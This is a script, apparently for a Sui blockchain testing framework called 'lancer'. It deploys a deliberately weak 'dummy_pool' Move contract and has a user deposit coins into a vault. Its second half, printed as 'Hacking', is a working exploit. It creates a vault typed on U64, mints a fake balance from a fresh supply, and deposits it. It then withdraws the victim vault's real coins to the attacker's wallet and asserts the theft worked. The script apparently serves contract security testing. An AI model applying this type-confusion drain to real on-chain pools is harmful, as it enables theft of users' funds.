let io @ { ? } = import! std.io
let { ? } = import! lancer.sui.digest
let { ? } = import! lancer.sui.sui_address
let { object_change_kind, ObjectChange, ? } = import! lancer.rpc
let { ? } = import! std.byte
let array = import! std.array
let c = import! lancer.compiler
let {
    current_wallet,
    start,
    execute,
    generate_keypair,
    get_coins,
    get_balance,
    commit,
    report_owner_by
} = import! lancer
let { find_map } = import! std.foldable
let { unwrap } = import! std.option
let { is_empty } = import! std.array
let { TypeTag, StructTag } = import! lancer.sui.types
let { new_builder, ObjectRef, ObjectArg, ? } = import! lancer.transaction
let { ? } = import! lancer.sui.types
let { parse } = import! lancer.parse
let { assert } = import! std.assert
let { unwrap_ok, ? } = import! std.result

start
io.print ("Preparation: " ++ (show (unwrap (current_wallet ()))) ++ "\n")
do p = c.compile "../../sui/dummy_pool"
let tx =
    let b = new_builder ()
    b.publish_immutable (c.bytes p) (c.dep_ids p)
    b.finish ()
do r = execute (unwrap_ok tx) None

let package_id = unwrap (find_map (\x ->
    match x with
    | Published { package_id, ? } -> Some package_id
    | _ -> None) r.object_changes)
let (state_id, state_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "DummyPool",
            type_params,
        }, ? } ->
            if address == package_id && is_empty type_params then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)

let some_coin_struct: StructTag = {
    address = package_id,
    module = "some_coin",
    name = "SOME_COIN",
    type_params = [],
}

let some_coin_type: TypeTag = Struct some_coin_struct

let dummy_pool_coin_struct: StructTag = {
    address = package_id,
    module = "dummy_pool",
    name = "DUMMY_POOL",
    type_params = [],
}

let dummy_pool_coin_type: TypeTag = Struct dummy_pool_coin_struct

do sui_framework = parse "0x0000000000000000000000000000000000000000000000000000000000000002"

let some_coin_object_ref: ObjectRef = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "coin",
            name = "Coin",
            type_params,
        }, ? } -> if address == sui_framework && type_params == [some_coin_type] then Some (object_id, version, digest) else None
    | _ -> None) r.object_changes)

let tx =
    let b = new_builder ()
    do state_arg = b.object_ref (SharedObject {
        id = state_id,
        initial_shared_version = state_version,
         mutable = True,
    })
    b.move_call package_id "dummy_pool" "create_vault" [ some_coin_type ] [
        state_arg,
        unwrap_ok (b.u64 10000)
    ]
    b.finish ()
do r = execute (unwrap_ok tx) None

let (vault_id, vault_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "Vault",
            type_params,
        }, ? } ->
            if address == package_id && type_params == [some_coin_type] then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)
// io.print (show r.object_changes)

do user = generate_keypair
let tx =
    let b = new_builder ()
    b.pay [some_coin_object_ref] [10000000] [user]
    b.finish ()
do r = execute (unwrap_ok tx) None

do coins = get_coins some_coin_struct user
let _ = assert(array.len coins == 1)
let coin = array.index coins 0

let tx =
    let b = new_builder ()
    do state_arg = b.object_ref (SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    })
    do vault_arg = b.object_ref (SharedObject {
        id = vault_id,
        initial_shared_version = vault_version,
        mutable = True,
    })
    do coin_arg = b.object_ref (ImmOrOwnedObject (coin.coin_object_id, coin.version, coin.digest))
    b.move_call package_id "dummy_pool" "deposit" [ some_coin_type ] [
        state_arg,
        vault_arg,
        coin_arg
    ]
    b.finish ()
do r = execute (unwrap_ok tx) (Some user)
// io.print (show r)
commit
io.print ("Hacking: " ++ (show (unwrap (current_wallet ()))) ++ "\n")

let tx =
    let b = new_builder ()
    do state_arg = b.object_ref (SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    })
    b.move_call package_id "dummy_pool" "create_vault" [ U64 ] [
        state_arg,
        unwrap_ok (b.u64 10000)
    ]
    b.finish ()
do r = execute (unwrap_ok tx) None

let (hacker_vault_id, hacker_vault_version) = unwrap (find_map (\x ->
    match x with
    | Created {
        object_id,
        version,
        digest,
        object_type = { 
            address,
            module = "dummy_pool",
            name = "Vault",
            type_params,
        }, ? } ->
            if address == package_id && type_params == [U64] then
                Some (object_id, version)
            else None
    | _ -> None) r.object_changes)
io.print ("Hacker vault " ++ (show hacker_vault_id) ++ " created\n")

let tx =
    let b = new_builder ()
    do supply_arg = b.move_call sui_framework "balance" "create_supply" [U64] [unwrap_ok (b.u64 0)]
    do balance_arg = b.move_call sui_framework "balance" "increase_supply" [U64] [
        supply_arg,
        unwrap_ok (b.u64 10000000)
    ]
    do state_arg = b.object_ref (SharedObject {
        id = state_id,
        initial_shared_version = state_version,
        mutable = True,
    })
    do hacker_vault_arg = b.object_ref (SharedObject {
        id = hacker_vault_id,
        initial_shared_version = hacker_vault_version,
        mutable = True,
    })
    do lst_arg = b.move_call package_id "dummy_pool" "deposit_balance" [U64] [
        state_arg,
        hacker_vault_arg,
        balance_arg
    ]
    do vault_arg = b.object_ref (SharedObject {
        id = vault_id,
        initial_shared_version = vault_version,
        mutable = True,
    })
    do goods_arg = b.move_call package_id "dummy_pool" "withdraw_balance" [ some_coin_type ] [
        state_arg,
        vault_arg,
        lst_arg
    ]
    do goods_arg = b.move_call sui_framework "coin" "from_balance" [some_coin_type] [goods_arg]
    b.move_call sui_framework "transfer" "public_transfer" [Struct {
        address = sui_framework,
        module = "coin",
        name = "Coin",
        type_params = [some_coin_type],
    }] [
        goods_arg,
        unwrap_ok (b.address (unwrap (current_wallet ()))),
    ]

    let supply_type: TypeTag = Struct {
        address = sui_framework,
        module = "balance",
        name = "Supply",
        type_params = [U64],
    }
    do versioned_arg = b.move_call sui_framework "versioned" "create" [supply_type] [
        unwrap_ok (b.u64 0),
        supply_arg
    ]
    b.move_call sui_framework "transfer" "public_freeze_object" [Struct {
        address = sui_framework,
        module = "versioned",
        name = "Versioned",
        type_params = [],
    }] [
        versioned_arg,
    ]
    b.finish ()
do r = execute (unwrap_ok tx) None
// io.print (show r)
do balance = get_balance some_coin_struct (unwrap (current_wallet ()))
let _ = assert(balance > 0)
report_owner_by None
